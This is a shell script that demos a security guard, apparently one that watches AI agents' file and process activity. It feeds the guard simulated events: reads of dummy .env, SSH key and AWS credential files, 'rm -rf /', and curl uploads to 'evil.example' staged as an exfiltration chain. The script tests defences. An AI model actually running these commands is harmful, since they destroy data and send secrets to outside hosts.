#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT_DIR"

DEMO_DIR=".404gent/os-guard-demo"
DEMO_ENV="$DEMO_DIR/.env"
DEMO_KEY="$DEMO_DIR/id_rsa"
DEMO_AWS="$DEMO_DIR/aws_credentials"
PID=1234

mkdir -p "$DEMO_DIR"
if [[ ! -f "$DEMO_ENV" ]]; then
  printf 'OS_GUARD_DEMO_SECRET=not-a-real-secret\n' > "$DEMO_ENV"
fi
if [[ ! -f "$DEMO_KEY" ]]; then
  printf '%s\n' '-----BEGIN OPENSSH PRIVATE KEY-----' 'demo-only' '-----END OPENSSH PRIVATE KEY-----' > "$DEMO_KEY"
fi
if [[ ! -f "$DEMO_AWS" ]]; then
  printf '%s\n' '[default]' 'aws_access_key_id=DEMOONLY' 'aws_secret_access_key=not-a-real-secret' > "$DEMO_AWS"
fi

run_allow() {
  local title="$1"
  shift
  printf '\n[%s]\n' "$title"
  printf '$ %s\n' "$*"
  "$@"
}

run_risk() {
  local title="$1"
  shift
  printf '\n[%s]\n' "$title"
  printf '$ %s\n' "$*"
  "$@" || true
}

cat <<'BANNER'
=== 404gent OS Guard Simulation Demo ===

This demo does not require Apple's EndpointSecurity entitlement.
It emits simulated OS open/exec events into the same policy, audit,
state, vector, and dashboard pipeline used by the native daemon.
BANNER

run_allow "1. Ordinary file open is allowed" \
  node src/cli.js os-guard simulate-open README.md --agent demo --pid "$PID"

run_risk "2. Sensitive .env open is blocked" \
  node src/cli.js os-guard simulate-open "$DEMO_ENV" --agent demo --pid "$PID"

run_risk "3. Private key open is blocked" \
  node src/cli.js os-guard simulate-open "$DEMO_KEY" --agent demo --pid "$PID"

run_allow "4. Network transfer executable is warned" \
  node src/cli.js os-guard simulate-exec curl https://example.com/upload -d @- --agent demo --pid "$PID"

run_risk "5. Destructive executable arguments are blocked" \
  node src/cli.js os-guard simulate-exec rm -rf / --agent demo --pid "$PID"

cat <<'BYPASS'

[6. Bypass story: Python open() becomes the same OS open event]
$ python3 -c 'open(".env").read()'
In native mode, EndpointSecurity AUTH_OPEN observes the file open below
the language runtime. This simulation records the equivalent OS event.
BYPASS
run_risk "6a. Simulated Python bypass open is blocked" \
  node src/cli.js os-guard simulate-open "$DEMO_ENV" --agent python-bypass --pid "$PID"

run_risk "7. Cloud credentials open is blocked" \
  node src/cli.js os-guard simulate-open "$DEMO_AWS" --agent demo --pid "$PID"

cat <<'CHAIN'

[8. Exfil chain: sensitive read followed by outbound transfer]
The same agent first touches a secret-bearing file, then attempts to
launch a network transfer tool. The dashboard/audit feed can show both
events as one incident chain.
CHAIN
run_risk "8a. exfil-agent sensitive file open is blocked" \
  node src/cli.js os-guard simulate-open "$DEMO_ENV" --agent exfil-agent --pid "$PID"
run_allow "8b. exfil-agent outbound curl is warned" \
  node src/cli.js os-guard simulate-exec curl https://evil.example/upload -d @- --agent exfil-agent --pid "$PID"

cat <<'DONE'

Inspect the recorded events:
  tail -n 12 .404gent/events.jsonl

Open the dashboard:
  npm run dashboard
DONE
